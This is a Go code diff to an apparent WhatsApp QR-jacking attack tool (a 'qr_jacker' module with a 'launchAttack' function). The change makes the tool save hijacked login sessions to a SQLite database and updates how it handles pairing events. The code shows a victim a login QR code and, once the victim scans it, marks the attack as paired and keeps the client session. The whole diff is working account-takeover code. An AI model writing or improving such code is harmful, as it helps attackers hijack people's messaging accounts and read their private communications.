@@ -16,7 +16,9 @@ import (
 
 	"go.mau.fi/whatsmeow"
 	"go.mau.fi/whatsmeow/store"
+	"go.mau.fi/whatsmeow/store/sqlstore"
 	waLog "go.mau.fi/whatsmeow/util/log"
+	_ "modernc.org/sqlite"
 	"rsc.io/qr"
 
 	"programa/utils"
@@ -122,10 +124,22 @@ func launchAttack(cfg attackCfg) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	device := &store.Device{
-		Container: &store.NoopStore{},
+	sqlCtx, sqlCancel := context.WithTimeout(context.Background(), 10*time.Second)
+	container, err := sqlstore.New(sqlCtx, "sqlite3", "file:scripts/qr_jacker/whatsapp/whatsmeow.db?_foreign_keys=on&cache=shared", waLog.Noop)
+	sqlCancel()
+	if err != nil {
+		fmt.Printf("%s[!] Failed to create device container: %v%s\n", utils.Red, err, utils.Reset)
+		utils.PauseForInput()
+		return
 	}
-	device.SetAllStores(&store.NoopStore{})
+
+	device, err := container.GetFirstDevice(ctx)
+	if err != nil {
+		fmt.Printf("%s[!] Failed to get device: %v%s\n", utils.Red, err, utils.Reset)
+		utils.PauseForInput()
+		return
+	}
+
 	cli := whatsmeow.NewClient(device, waLog.Noop)
 
 	qrChan, err := cli.GetQRChannel(ctx)
@@ -149,7 +163,7 @@ func launchAttack(cfg attackCfg) {
 				currentAttack.mu.Lock()
 				currentAttack.qrCode = item.Code
 				currentAttack.mu.Unlock()
-			case "success":
+			case whatsmeow.QRChannelSuccess.Event:
 				currentAttack.mu.Lock()
 				currentAttack.paired = true
 				currentAttack.sessionData = cli.Store
@@ -163,15 +177,15 @@ func launchAttack(cfg attackCfg) {
 					currentAttack.errorMsg = item.Error.Error()
 				}
 				currentAttack.mu.Unlock()
-			case "err-client-outdated":
+			case whatsmeow.QRChannelClientOutdated.Event:
 				currentAttack.mu.Lock()
 				currentAttack.errorMsg = "whatsmeow client outdated, please update"
 				currentAttack.mu.Unlock()
-			case "timeout":
+			case whatsmeow.QRChannelTimeout.Event:
 				currentAttack.mu.Lock()
 				currentAttack.errorMsg = "pairing timeout"
 				currentAttack.mu.Unlock()
-			case "err-unexpected-state":
+			case whatsmeow.QRChannelErrUnexpectedEvent.Event:
 				currentAttack.mu.Lock()
 				currentAttack.errorMsg = "unexpected state (already paired?)"
 				currentAttack.mu.Unlock()
